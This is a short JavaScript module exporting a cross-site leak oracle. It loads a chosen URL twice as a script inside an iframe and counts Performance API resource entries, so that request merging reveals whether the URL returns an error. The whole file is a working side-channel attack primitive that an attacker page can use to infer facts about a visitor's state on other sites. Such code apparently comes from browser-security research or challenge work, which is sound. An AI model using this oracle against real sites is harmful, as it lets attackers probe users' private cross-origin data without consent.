const leak = async (url) => {
    return new Promise(r => {
        let iframe = document.createElement('iframe')

        // handle iframe report
        window.onmessage = async (e) => {
            // wait for performance API
            await sleep(300)
            // minus one for the result 0 or 1
            let res = iframe.contentWindow.performance.getEntriesByType("resource").length -1 
            // cleanup
            iframe.remove()


            // safari does not log 500 (leak in itself)
            // maybe take this out
            if(res === -1){
                return r(1)
            }
            return r(res)
        }

        // abuse request merging to detect errors (2 loads vs 1 load)
        iframe.srcdoc = `
        <html>
        <body>
                <script onerror="parent.postMessage('', '*')" 
                    src='${url}'><\/script>
                <script onload="parent.postMessage('', '*')"
                    src='${url}'>
                <\/script>
        </body>
        </html>`


        // start the test
        document.body.appendChild(iframe)
    })
}


const sleep = (ms) => {
    return new Promise((r) => setTimeout(r,ms))
}

export { leak }